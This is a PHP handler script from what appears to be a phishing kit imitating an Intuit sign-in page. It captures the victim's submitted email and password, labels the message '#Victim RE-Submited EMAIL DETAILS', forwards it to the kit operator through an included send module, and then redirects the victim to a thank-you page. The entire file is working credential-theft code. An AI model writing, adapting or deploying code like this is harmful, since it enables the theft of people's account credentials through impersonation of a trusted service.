<?php
require_once('./Module/Setmodule.php');


$message .= "|Wassup, $yourname|| #Victim RE-Submited EMAIL DETAILS to your INTUIT page \n"."\n";
$message .= "|Email: ".$_POST['email']."\n"; 
$message .= "|Last Name: ".$_POST['epass']."\n\n"; 



require_once('Module/SendModule.php');



	header("Location: ../thankyou.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  
?>